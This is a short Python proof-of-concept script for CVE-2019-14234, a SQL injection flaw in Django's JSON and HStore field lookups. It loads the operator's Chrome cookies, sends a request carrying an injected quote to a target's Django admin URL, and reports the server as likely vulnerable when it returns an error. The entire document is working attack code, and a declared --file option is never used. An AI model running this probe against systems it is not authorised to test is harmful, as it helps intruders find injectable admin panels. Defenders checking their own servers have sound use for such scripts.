import requests
import browser_cookie3
import argparse

def exploit(url):
    cookie = browser_cookie3.chrome()
    expurl ='http://' + url + '/admin/vuln/collection/?detail__a%27b=1'
    try:
        response = requests.get(url=expurl,cookies=cookie)
        if response.status_code == 500:
            print("It looks likely vulnerable")

    except Exception as e:
        print(e)

if __name__ == '__main__':
    parameter = argparse.ArgumentParser(description='Poc CVE-2019-14234:')
    parameter.add_argument('--file',help='url file',required=False)
    parameter.add_argument('--url',help='ip:port',required=False)
    para = parameter.parse_args()

    if para.url:
        exploit(para.url)
        exit()
    else:
        parameter.print_help()
